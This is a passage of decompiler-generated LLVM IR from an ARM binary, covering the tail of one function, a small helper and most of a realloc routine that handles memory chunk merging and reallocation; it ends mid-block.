  %v3_1dfc8 = add i32 %v2_1dfc8, 32
  %v4_1dfc8 = inttoptr i32 %v3_1dfc8 to i32*
  store i32 0, i32* %v4_1dfc8, align 4
  %v2_1dfcc = load i32, i32* %r4.global-to-local, align 4
  %v3_1dfcc = add i32 %v2_1dfcc, 28
  %v4_1dfcc = inttoptr i32 %v3_1dfcc to i32*
  store i32 0, i32* %v4_1dfcc, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1dfbc, %dec_label_pc_1df70, %dec_label_pc_1df24, %dec_label_pc_1dfac, %dec_label_pc_1df98, %dec_label_pc_1df90, %bb
  store i32 1, i32* @r1, align 4
  %v0_1dfdc = load i32, i32* @r5, align 4
  %v2_1dfdc = add i32 %v0_1dfdc, 52
  %v3_1dfdc = inttoptr i32 %v2_1dfdc to i32*
  %v4_1dfdc = load i32, i32* %v3_1dfdc, align 4
  store i32 %v4_1dfdc, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1dfdc)
  br label %dec_label_pc_1dfe8

dec_label_pc_1dfe8:                               ; preds = %dec_label_pc_1df08, %.thread
  %v0_1dfe8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_1ded4, i32* @r4, align 4
  store i32 %v6_1ded4, i32* @r5, align 4
  store i32 %v9_1ded4, i32* @r6, align 4
  store i32 %v12_1ded4, i32* @lr, align 4
  ret i32 %v0_1dfe8

; uselistorder directives
  uselistorder i32 %v1_1df80, { 0, 6, 3, 1, 5, 4, 2 }
  uselistorder i32 %v1_1df64, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1dfe8, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 3, 4, 5, 1, 2 }
}

define i32 @function_1e000(i32 %arg1) local_unnamed_addr {
dec_label_pc_1e000:
  %v0_1e000 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1e000, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1e000
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1e000, %bb
  %v10_1e010 = phi i32 [ %arg1, %dec_label_pc_1e000 ], [ 0, %bb ]
  ret i32 %v10_1e010

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1e014 = load i32, i32* @r4, align 4
  %v6_1e014 = load i32, i32* @r5, align 4
  %v9_1e014 = load i32, i32* @r6, align 4
  %v12_1e014 = load i32, i32* @r7, align 4
  %v15_1e014 = load i32, i32* @r8, align 4
  %v18_1e014 = load i32, i32* @sb, align 4
  %v21_1e014 = load i32, i32* @sl, align 4
  %v24_1e014 = load i32, i32* @fp, align 4
  %v27_1e014 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_1e020 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1e020, label %dec_label_pc_1e034, label %dec_label_pc_1e044

dec_label_pc_1e034:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_1e038 = call i32 @malloc(i32 %arg2)
  store i32 %v1_1e038, i32* %r0.global-to-local, align 4
  store i32 %v1_1e038, i32* @r4, align 4
  br label %dec_label_pc_1e3a4

dec_label_pc_1e044:                               ; preds = %entry
  %v2_1e044 = icmp eq i32 %arg2, 0
  br i1 %v2_1e044, label %dec_label_pc_1e04c, label %dec_label_pc_1e058

dec_label_pc_1e04c:                               ; preds = %dec_label_pc_1e044
  %v0_1e04c = call i32 @free()
  store i32 %v0_1e04c, i32* %r0.global-to-local, align 4
  %v0_1e050 = load i32, i32* @r6, align 4
  store i32 %v0_1e050, i32* @r4, align 4
  br label %dec_label_pc_1e3a4

dec_label_pc_1e058:                               ; preds = %dec_label_pc_1e044
  store i32 120, i32* %r3.global-to-local, align 4
  %v4_1e060 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 120) to i32*), align 4
  store i32 %v4_1e060, i32* @r4, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 %v4_1e060, i32* %r2.global-to-local, align 4
  %v4_1e06c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 76) to i32*), align 4
  store i32 %v4_1e06c, i32* %r1.global-to-local, align 4
  %v2_1e070 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1e070, i32* %r0.global-to-local, align 4
  store i32 124, i32* %r3.global-to-local, align 4
  %v4_1e078 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 124) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1e078)
  %v0_1e084 = load i32, i32* @r4, align 4
  store i32 %v0_1e084, i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r1.global-to-local, align 4
  %v4_1e090 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 20) to i32*), align 4
  store i32 %v4_1e090, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_1e09c.1772 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1e090)
  %v0_1e09c = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_1e09c, -32
  br i1 %tmp36, label %dec_label_pc_1e0c0, label %dec_label_pc_1e0a4

dec_label_pc_1e0a4:                               ; preds = %dec_label_pc_1e058
  store i32 ptrtoint (i32* @global_var_13fd4.1325 to i32), i32* %r2.global-to-local, align 4
  %v0_1e0a8 = call i32 @__aeabi_read_tp()
  store i32 %v0_1e0a8, i32* %r0.global-to-local, align 4
  %v3_1e0ac = load i16, i16* @global_var_32088.1320, align 2
  %v4_1e0ac = sext i16 %v3_1e0ac to i32
  store i32 %v4_1e0ac, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_1e0b8 = add i32 %v4_1e0ac, %v0_1e0a8
  %v4_1e0b8 = inttoptr i32 %v3_1e0b8 to i32*
  store i32 12, i32* %v4_1e0b8, align 4
  br label %dec_label_pc_1e3a4

dec_label_pc_1e0c0:                               ; preds = %dec_label_pc_1e058
  %v1_1e0c0 = add i32 %v0_1e09c, 11
  store i32 %v1_1e0c0, i32* %r0.global-to-local, align 4
  %v0_1e0c4 = load i32, i32* @r5, align 4
  %v1_1e0c4 = add i32 %v0_1e0c4, -4
  %v2_1e0c4 = inttoptr i32 %v1_1e0c4 to i32*
  %v3_1e0c4 = load i32, i32* %v2_1e0c4, align 4
  store i32 %v3_1e0c4, i32* %r2.global-to-local, align 4
  %v2_1e0c8 = icmp ugt i32 %v1_1e0c0, 14
  %v7_1e0c8 = icmp eq i32 %v1_1e0c0, 15
  %v2_1e0cc = xor i1 %v2_1e0c8, true
  %v3_1e0cc = or i1 %v7_1e0c8, %v2_1e0cc
  br i1 %v3_1e0cc, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_1e0c0
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_1e0c0, %bb
  %v2_1e0d0 = xor i1 %v7_1e0c8, true
  %v3_1e0d0 = and i1 %v2_1e0c8, %v2_1e0d0
  br i1 %v3_1e0d0, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_1e0d0 = and i32 %v1_1e0c0, -8
  store i32 %v5_1e0d0, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_1e0d4 = and i32 %v3_1e0c4, 2
  %v2_1e0d4 = icmp eq i32 %v1_1e0d4, 0
  %v1_1e0d8 = add i32 %v0_1e0c4, -8
  store i32 %v1_1e0d8, i32* @sl, align 4
  %v1_1e0dc = and i32 %v3_1e0c4, -4
  store i32 %v1_1e0dc, i32* @r6, align 4
  br i1 %v2_1e0d4, label %dec_label_pc_1e0e4, label %dec_label_pc_1e2bc

dec_label_pc_1e0e4:                               ; preds = %bb29
  %v1_1e0e4 = load i32, i32* @sb, align 4
  %v3_1e0e4 = icmp ult i32 %v1_1e0dc, %v1_1e0e4
  br i1 %v3_1e0e4, label %dec_label_pc_1e0f0, label %bb30

bb30:                                             ; preds = %dec_label_pc_1e0e4
  store i32 %v1_1e0dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e254

dec_label_pc_1e0f0:                               ; preds = %dec_label_pc_1e0e4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_1e0f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 72) to i32*), align 4
  store i32 %v4_1e0f8, i32* %r0.global-to-local, align 4
  %v1_1e0fc = add i32 %v4_1e0f8, 44
  %v2_1e0fc = inttoptr i32 %v1_1e0fc to i32*
  %v3_1e0fc = load i32, i32* %v2_1e0fc, align 4
  store i32 %v3_1e0fc, i32* %r3.global-to-local, align 4
  %v2_1e100 = add i32 %v1_1e0dc, %v1_1e0d8
  store i32 %v2_1e100, i32* @r4, align 4
  %v9_1e104 = icmp eq i32 %v2_1e100, %v3_1e0fc
  %v1_1e108 = add i32 %v2_1e100, 4
  %v2_1e108 = inttoptr i32 %v1_1e108 to i32*
  %v3_1e108 = load i32, i32* %v2_1e108, align 4
  store i32 %v3_1e108, i32* %r1.global-to-local, align 4
  br i1 %v9_1e104, label %dec_label_pc_1e110, label %dec_label_pc_1e14c

dec_label_pc_1e110:                               ; preds = %dec_label_pc_1e0f0
  %v1_1e110 = and i32 %v3_1e108, -4
  %v2_1e114 = add i32 %v1_1e110, %v1_1e0dc
  store i32 %v2_1e114, i32* %r1.global-to-local, align 4
  %v1_1e118 = add i32 %v1_1e0e4, 16
  store i32 %v1_1e118, i32* %r3.global-to-local, align 4
  %v3_1e11c = icmp ult i32 %v2_1e114, %v1_1e118
  br i1 %v3_1e11c, label %dec_label_pc_1e1a0, label %dec_label_pc_1e124

dec_label_pc_1e124:                               ; preds = %dec_label_pc_1e110
  %v2_1e124 = sub i32 %v2_1e114, %v1_1e0e4
  %v1_1e128 = urem i32 %v3_1e0c4, 2
  %v2_1e12c = add i32 %v1_1e0e4, %v1_1e0d8
  store i32 %v2_1e12c, i32* %r1.global-to-local, align 4
  %v2_1e130 = or i32 %v1_1e0e4, %v1_1e128
  store i32 %v2_1e130, i32* %r2.global-to-local, align 4
  %v1_1e134 = or i32 %v2_1e124, 1
  store i32 %v1_1e134, i32* %r3.global-to-local, align 4
  store i32 %v0_1e0c4, i32* @r4, align 4
  store i32 %v2_1e130, i32* %v2_1e0c4, align 4
  %v0_1e140 = load i32, i32* %r1.global-to-local, align 4
  %v1_1e140 = load i32, i32* %r0.global-to-local, align 4
  %v2_1e140 = add i32 %v1_1e140, 44
  %v3_1e140 = inttoptr i32 %v2_1e140 to i32*
  store i32 %v0_1e140, i32* %v3_1e140, align 4
  %v0_1e144 = load i32, i32* %r3.global-to-local, align 4
  %v1_1e144 = load i32, i32* %r1.global-to-local, align 4
  %v2_1e144 = add i32 %v1_1e144, 4
  %v3_1e144 = inttoptr i32 %v2_1e144 to i32*
  store i32 %v0_1e144, i32* %v3_1e144, align 4
  br label %dec_label_pc_1e388

dec_label_pc_1e14c:                               ; preds = %dec_label_pc_1e0f0
  %v1_1e14c = and i32 %v3_1e108, -2
  %v2_1e150 = add i32 %v1_1e14c, %v2_1e100
  store i32 %v2_1e150, i32* %r3.global-to-local, align 4
  %v1_1e154 = add i32 %v2_1e150, 4
  %v2_1e154 = inttoptr i32 %v1_1e154 to i32*
  %v3_1e154 = load i32, i32* %v2_1e154, align 4
  store i32 %v3_1e154, i32* %r3.global-to-local, align 4
  %v1_1e158 = urem i32 %v3_1e154, 2
  %v2_1e158 = icmp eq i32 %v1_1e158, 0
  br i1 %v2_1e158, label %dec_label_pc_1e160, label %dec_label_pc_1e1a0

dec_label_pc_1e160:                               ; preds = %dec_label_pc_1e14c
  %v1_1e160 = and i32 %v3_1e108, -4
  store i32 %v1_1e160, i32* %r3.global-to-local, align 4
  %v2_1e164 = add i32 %v1_1e160, %v1_1e0dc
  store i32 %v2_1e164, i32* %r0.global-to-local, align 4
  %v3_1e168 = icmp ult i32 %v2_1e164, %v1_1e0e4
  br i1 %v3_1e168, label %dec_label_pc_1e1a0, label %dec_label_pc_1e170

dec_label_pc_1e170:                               ; preds = %dec_label_pc_1e160
  %v1_1e170 = add i32 %v1_1e0dc, %v0_1e0c4
  %v2_1e170 = inttoptr i32 %v1_1e170 to i32*
  %v3_1e170 = load i32, i32* %v2_1e170, align 4
  store i32 %v3_1e170, i32* %r1.global-to-local, align 4
  %v1_1e174 = add i32 %v3_1e170, 12
  %v2_1e174 = inttoptr i32 %v1_1e174 to i32*
  %v3_1e174 = load i32, i32* %v2_1e174, align 4
  store i32 %v3_1e174, i32* %r3.global-to-local, align 4
  %v9_1e178 = icmp eq i32 %v3_1e174, %v2_1e100
  %v1_1e17c = add i32 %v2_1e100, 12
  %v2_1e17c = inttoptr i32 %v1_1e17c to i32*
  %v3_1e17c = load i32, i32* %v2_1e17c, align 4
  store i32 %v3_1e17c, i32* %r2.global-to-local, align 4
  br i1 %v9_1e178, label %dec_label_pc_1e184, label %dec_label_pc_1e190

dec_label_pc_1e184:                               ; preds = %dec_label_pc_1e170
  %v1_1e184 = add i32 %v3_1e17c, 8
  %v2_1e184 = inttoptr i32 %v1_1e184 to i32*
  %v3_1e184 = load i32, i32* %v2_1e184, align 4
  store i32 %v3_1e184, i32* %r3.global-to-local, align 4
  %v9_1e188 = icmp eq i32 %v3_1e184, %v2_1e100
  br i1 %v9_1e188, label %dec_label_pc_1e194, label %dec_label_pc_1e190

dec_label_pc_1e190:                               ; preds = %dec_label_pc_1e170, %dec_label_pc_1e184
  %v0_1e190 = call i32 @abort()
  store i32 %v0_1e190, i32* %r0.global-to-local, align 4
  %v0_1e194.pre = load i32, i32* @r1, align 4
  %v1_1e194.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1e194

dec_label_pc_1e194:                               ; preds = %dec_label_pc_1e184, %dec_label_pc_1e190
  %v1_1e194 = phi i32 [ %v3_1e17c, %dec_label_pc_1e184 ], [ %v1_1e194.pre, %dec_label_pc_1e190 ]
  %v0_1e194 = phi i32 [ %v3_1e170, %dec_label_pc_1e184 ], [ %v0_1e194.pre, %dec_label_pc_1e190 ]
  %v2_1e194 = add i32 %v1_1e194, 8
  %v3_1e194 = inttoptr i32 %v2_1e194 to i32*
  store i32 %v0_1e194, i32* %v3_1e194, align 4
  %v0_1e198 = load i32, i32* %r2.global-to-local, align 4
  %v1_1e198 = load i32, i32* %r1.global-to-local, align 4
  %v2_1e198 = add i32 %v1_1e198, 12
  %v3_1e198 = inttoptr i32 %v2_1e198 to i32*
  store i32 %v0_1e198, i32* %v3_1e198, align 4
  %v1_1e254.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e254

dec_label_pc_1e1a0:                               ; preds = %dec_label_pc_1e110, %dec_label_pc_1e160, %dec_label_pc_1e14c
  %v1_1e1a0 = add i32 %v1_1e0e4, -7
  store i32 %v1_1e1a0, i32* %r0.global-to-local, align 4
  %v1_1e1a4 = call i32 @malloc(i32 %v1_1e1a0)
  store i32 %v1_1e1a4, i32* @r0, align 4
  store i32 %v1_1e1a4, i32* %r1.global-to-local, align 4
  %v2_1e1a8 = icmp eq i32 %v1_1e1a4, 0
  br i1 %v2_1e1a8, label %bb31, label %dec_label_pc_1e1b4

bb31:                                             ; preds = %dec_label_pc_1e1a0
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1e388

dec_label_pc_1e1b4:                               ; preds = %dec_label_pc_1e1a0
  %v1_1e1bc.pre = load i32, i32* @r4, align 4
  %v1_1e1b4 = add i32 %v1_1e1a4, -4
  %v2_1e1b4 = inttoptr i32 %v1_1e1b4 to i32*
  %v3_1e1b4 = load i32, i32* %v2_1e1b4, align 4
  store i32 %v3_1e1b4, i32* @r3, align 4
  %v1_1e1b8 = add i32 %v1_1e1a4, -8
  store i32 %v1_1e1b8, i32* @r7, align 4
  %v9_1e1bc = icmp eq i32 %v1_1e1b8, %v1_1e1bc.pre
  br i1 %v9_1e1bc, label %.thread2, label %dec_label_pc_1e1cc

.thread2:                                         ; preds = %dec_label_pc_1e1b4
  %v2_1e1c0 = and i32 %v3_1e1b4, -4
  store i32 %v2_1e1c0, i32* %r3.global-to-local, align 4
  %v2_1e1c4 = load i32, i32* @r6, align 4
  %v3_1e1c4 = add i32 %v2_1e1c4, %v2_1e1c0
  store i32 %v3_1e1c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e254

dec_label_pc_1e1cc:                               ; preds = %dec_label_pc_1e1b4
  %v0_1e1cc = load i32, i32* @r6, align 4
  %v1_1e1cc = add i32 %v0_1e1cc, -4
  store i32 %v1_1e1cc, i32* @r2, align 4
  %v3_1e1d0 = udiv i32 %v1_1e1cc, 4
  store i32 %v3_1e1d0, i32* @ip, align 4
  %tmp37 = and i32 %v1_1e1cc, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_1e1d8 = icmp ult i32 %v1_1e1cc, 36
  %v3_1e1d8 = or i1 %tmp38, %v2_1e1d8
  %v0_1e1e8 = load i32, i32* @r5, align 4
  br i1 %v3_1e1d8, label %dec_label_pc_1e1e8, label %dec_label_pc_1e1dc

dec_label_pc_1e1dc:                               ; preds = %dec_label_pc_1e1cc
  store i32 %v0_1e1e8, i32* @r1, align 4
  %v0_1e1e0 = call i32 @memcpy()
  store i32 %v0_1e1e0, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_1e1e8:                               ; preds = %dec_label_pc_1e1cc
  %v1_1e1e8 = inttoptr i32 %v0_1e1e8 to i32*
  %v2_1e1e8 = load i32, i32* %v1_1e1e8, align 4
  store i32 %v2_1e1e8, i32* %r3.global-to-local, align 4
  %v2_1e1ec = inttoptr i32 %v1_1e1a4 to i32*
  store i32 %v2_1e1e8, i32* %v2_1e1ec, align 4
  %v0_1e1f0 = load i32, i32* @r5, align 4
  %v1_1e1f0 = add i32 %v0_1e1f0, 4
  %v2_1e1f0 = inttoptr i32 %v1_1e1f0 to i32*
  %v3_1e1f0 = load i32, i32* %v2_1e1f0, align 4
  store i32 %v3_1e1f0, i32* %r3.global-to-local, align 4
  %v1_1e1f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_1e1f4 = add i32 %v1_1e1f4, 4
  %v3_1e1f4 = inttoptr i32 %v2_1e1f4 to i32*
  store i32 %v3_1e1f0, i32* %v3_1e1f4, align 4
  %v0_1e1f8 = load i32, i32* @r5, align 4
  %v1_1e1f8 = add i32 %v0_1e1f8, 8
  %v2_1e1f8 = inttoptr i32 %v1_1e1f8 to i32*
  %v3_1e1f8 = load i32, i32* %v2_1e1f8, align 4
  store i32 %v3_1e1f8, i32* %r3.global-to-local, align 4
  %v0_1e1fc = load i32, i32* @ip, align 4
  %v1_1e200 = load i32, i32* %r1.global-to-local, align 4
  %v2_1e200 = add i32 %v1_1e200, 8
  %v3_1e200 = inttoptr i32 %v2_1e200 to i32*
  store i32 %v3_1e1f8, i32* %v3_1e200, align 4
  %tmp39 = icmp ult i32 %v0_1e1fc, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_1e208

dec_label_pc_1e208:                               ; preds = %dec_label_pc_1e1e8
  %v0_1e208 = load i32, i32* @r5, align 4
  %v1_1e208 = add i32 %v0_1e208, 12
  %v2_1e208 = inttoptr i32 %v1_1e208 to i32*
  %v3_1e208 = load i32, i32* %v2_1e208, align 4
  store i32 %v3_1e208, i32* %r3.global-to-local, align 4
  %v1_1e20c = load i32, i32* %r1.global-to-local, align 4
  %v2_1e20c = add i32 %v1_1e20c, 12
  %v3_1e20c = inttoptr i32 %v2_1e20c to i32*
  store i32 %v3_1e208, i32* %v3_1e20c, align 4
  %v0_1e210 = load i32, i32* @r5, align 4
  %v1_1e210 = add i32 %v0_1e210, 16
  %v2_1e210 = inttoptr i32 %v1_1e210 to i32*
  %v3_1e210 = load i32, i32* %v2_1e210, align 4
  store i32 %v3_1e210, i32* %r3.global-to-local, align 4
  %v0_1e214 = load i32, i32* @ip, align 4
  %v1_1e218 = load i32, i32* %r1.global-to-local, align 4
  %v2_1e218 = add i32 %v1_1e218, 16
  %v3_1e218 = inttoptr i32 %v2_1e218 to i32*
  store i32 %v3_1e210, i32* %v3_1e218, align 4
  %tmp40 = icmp ult i32 %v0_1e214, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_1e220

dec_label_pc_1e220:                               ; preds = %dec_label_pc_1e208
  %v0_1e220 = load i32, i32* @r5, align 4
  %v1_1e220 = add i32 %v0_1e220, 20
  %v2_1e220 = inttoptr i32 %v1_1e220 to i32*
  %v3_1e220 = load i32, i32* %v2_1e220, align 4
  store i32 %v3_1e220, i32* %r3.global-to-local, align 4
  %v1_1e224 = load i32, i32* %r1.global-to-local, align 4
  %v2_1e224 = add i32 %v1_1e224, 20
  %v3_1e224 = inttoptr i32 %v2_1e224 to i32*
  store i32 %v3_1e220, i32* %v3_1e224, align 4
  %v0_1e228 = load i32, i32* @r5, align 4
  %v1_1e228 = add i32 %v0_1e228, 24
  %v2_1e228 = inttoptr i32 %v1_1e228 to i32*
  %v3_1e228 = load i32, i32* %v2_1e228, align 4
  store i32 %v3_1e228, i32* %r3.global-to-local, align 4
  %v1_1e22c = load i32, i32* %r1.global-to-local, align 4
  %v2_1e22c = add i32 %v1_1e22c, 24
  %v3_1e22c = inttoptr i32 %v2_1e22c to i32*
  store i32 %v3_1e228, i32* %v3_1e22c, align 4
  %v0_1e230 = load i32, i32* @ip, align 4
  %v7_1e230 = icmp eq i32 %v0_1e230, 9
  br i1 %v7_1e230, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_1e220
  %v1_1e234 = load i32, i32* @r5, align 4
  %v2_1e234 = add i32 %v1_1e234, 28
  %v3_1e234 = inttoptr i32 %v2_1e234 to i32*
  %v4_1e234 = load i32, i32* %v3_1e234, align 4
  store i32 %v4_1e234, i32* %r3.global-to-local, align 4
  %v2_1e238 = load i32, i32* %r1.global-to-local, align 4
  %v3_1e238 = add i32 %v2_1e238, 28
  %v4_1e238 = inttoptr i32 %v3_1e238 to i32*
  store i32 %v4_1e234, i32* %v4_1e238, align 4
  %v1_1e23c = load i32, i32* @r5, align 4
  %v2_1e23c = add i32 %v1_1e23c, 32
  %v3_1e23c = inttoptr i32 %v2_1e23c to i32*
  %v4_1e23c = load i32, i32* %v3_1e23c, align 4
  store i32 %v4_1e23c, i32* %r3.global-to-local, align 4
  %v2_1e240 = load i32, i32* %r1.global-to-local, align 4
  %v3_1e240 = add i32 %v2_1e240, 32
  %v4_1e240 = inttoptr i32 %v3_1e240 to i32*
  store i32 %v4_1e23c, i32* %v4_1e240, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1e220, %dec_label_pc_1e208, %dec_label_pc_1e1e8, %dec_label_pc_1e1dc, %bb32
  %v0_1e244 = load i32, i32* @r5, align 4
  store i32 %v0_1e244, i32* @r0, align 4
  %v0_1e248 = call i32 @free()
  store i32 %v0_1e248, i32* %r0.global-to-local, align 4
  %v0_1e24c = load i32, i32* @r7, align 4
  %v1_1e24c = add i32 %v0_1e24c, 8
  store i32 %v1_1e24c, i32* @r4, align 4
  br label %dec_label_pc_1e388

dec_label_pc_1e254:                               ; preds = %bb30, %.thread2, %dec_label_pc_1e194
  %v0_1e268 = phi i32 [ %v3_1e1c4, %.thread2 ], [ %v1_1e0dc, %bb30 ], [ %v1_1e254.pre, %dec_label_pc_1e194 ]
  %v0_1e254 = load i32, i32* @sb, align 4
  %v2_1e254 = sub i32 %v0_1e268, %v0_1e254
  store i32 %v2_1e254, i32* %r1.global-to-local, align 4
  %v0_1e25c = load i32, i32* @sl, align 4
  %v1_1e25c = add i32 %v0_1e25c, 4
  %v2_1e25c = inttoptr i32 %v1_1e25c to i32*
  %v3_1e25c = load i32, i32* %v2_1e25c, align 4
  %tmp41 = icmp ugt i32 %v2_1e254, 15
  %v1_1e284 = urem i32 %v3_1e25c, 2
  store i32 %v1_1e284, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_1e284, label %dec_label_pc_1e264

dec_label_pc_1e264:                               ; preds = %dec_label_pc_1e254
  %v2_1e268 = or i32 %v1_1e284, %v0_1e268
  store i32 %v2_1e268, i32* %r3.global-to-local, align 4
  store i32 %v2_1e268, i32* %v2_1e25c, align 4
  %v0_1e270 = load i32, i32* @sl, align 4
  %v1_1e270 = load i32, i32* %r0.global-to-local, align 4
  %v2_1e270 = add i32 %v1_1e270, %v0_1e270
  store i32 %v2_1e270, i32* %r2.global-to-local, align 4
  %v1_1e274 = add i32 %v2_1e270, 4
  %v2_1e274 = inttoptr i32 %v1_1e274 to i32*
  %v3_1e274 = load i32, i32* %v2_1e274, align 4
  %v1_1e278 = or i32 %v3_1e274, 1
  store i32 %v1_1e278, i32* %r3.global-to-local, align 4
  store i32 %v1_1e278, i32* %v2_1e274, align 4
  br label %dec_label_pc_1e2b4

dec_label_pc_1e284:                               ; preds = %dec_label_pc_1e254
  %v2_1e288 = add i32 %v0_1e25c, %v0_1e254
  store i32 %v2_1e288, i32* %r0.global-to-local, align 4
  %v2_1e28c = or i32 %v1_1e284, %v0_1e254
  store i32 %v2_1e28c, i32* %r3.global-to-local, align 4
  %v1_1e290 = or i32 %v2_1e254, 1
  store i32 %v1_1e290, i32* %r2.global-to-local, align 4
  store i32 %v2_1e28c, i32* %v2_1e25c, align 4
  %v0_1e298 = load i32, i32* %r2.global-to-local, align 4
  %v1_1e298 = load i32, i32* %r0.global-to-local, align 4
  %v2_1e298 = add i32 %v1_1e298, 4
  %v3_1e298 = inttoptr i32 %v2_1e298 to i32*
  store i32 %v0_1e298, i32* %v3_1e298, align 4
  %v0_1e29c = load i32, i32* %r0.global-to-local, align 4
  %v1_1e29c = load i32, i32* %r1.global-to-local, align 4
  %v2_1e29c = add i32 %v1_1e29c, %v0_1e29c
  store i32 %v2_1e29c, i32* %r2.global-to-local, align 4
  %v1_1e2a0 = add i32 %v2_1e29c, 4
  %v2_1e2a0 = inttoptr i32 %v1_1e2a0 to i32*
  %v3_1e2a0 = load i32, i32* %v2_1e2a0, align 4
  %v1_1e2a4 = or i32 %v3_1e2a0, 1
  store i32 %v1_1e2a4, i32* %r3.global-to-local, align 4
  store i32 %v1_1e2a4, i32* %v2_1e2a0, align 4
  %v0_1e2ac = load i32, i32* %r0.global-to-local, align 4
  %v1_1e2ac = add i32 %v0_1e2ac, 8
  store i32 %v1_1e2ac, i32* @r0, align 4
  %v0_1e2b0 = call i32 @free()
  store i32 %v0_1e2b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e2b4

dec_label_pc_1e2b4:                               ; preds = %dec_label_pc_1e264, %dec_label_pc_1e284
  %v0_1e2b4 = load i32, i32* @sl, align 4
  %v1_1e2b4 = add i32 %v0_1e2b4, 8
  store i32 %v1_1e2b4, i32* @r4, align 4
  br label %dec_label_pc_1e388

dec_label_pc_1e2bc:                               ; preds = %bb29
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r1.global-to-local, align 4
  %v4_1e2c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 72) to i32*), align 4
  store i32 %v4_1e2c4, i32* @r8, align 4
  %v2_1e2c8 = inttoptr i32 %v1_1e0d8 to i32*
  %v3_1e2c8 = load i32, i32* %v2_1e2c8, align 4
  store i32 %v3_1e2c8, i32* @r4, align 4
  %v1_1e2cc = add i32 %v4_1e2c4, 860
  %v2_1e2cc = inttoptr i32 %v1_1e2cc to i32*
  %v3_1e2cc = load i32, i32* %v2_1e2cc, align 4
  %v1_1e2d0 = add i32 %v3_1e2c8, 4
  %v1_1e2d4 = add i32 %v3_1e2cc, -1
  store i32 %v1_1e2d4, i32* %r2.global-to-local, align 4
  %v2_1e2d8 = add i32 %v1_1e2d0, %v1_1e2d4
  %v1_1e2dc = load i32, i32* @sb, align 4
  %v2_1e2dc = add i32 %v2_1e2d8, %v1_1e2dc
  store i32 %v2_1e2dc, i32* %r3.global-to-local, align 4
  %v2_1e2e0 = sub i32 0, %v3_1e2cc
  %v3_1e2e0 = and i32 %v2_1e2dc, %v2_1e2e0
  store i32 %v3_1e2e0, i32* @r7, align 4
  %v2_1e2e4 = sub i32 %v3_1e2e0, %v3_1e2c8
  store i32 %v2_1e2e4, i32* @fp, align 4
  %v9_1e2e8 = icmp eq i32 %v1_1e0dc, %v2_1e2e4
  br i1 %v9_1e2e8, label %dec_label_pc_1e35c, label %dec_label_pc_1e2f0

dec_label_pc_1e2f0:                               ; preds = %dec_label_pc_1e2bc
  %v2_1e2f0 = sub i32 %v1_1e0d8, %v3_1e2c8
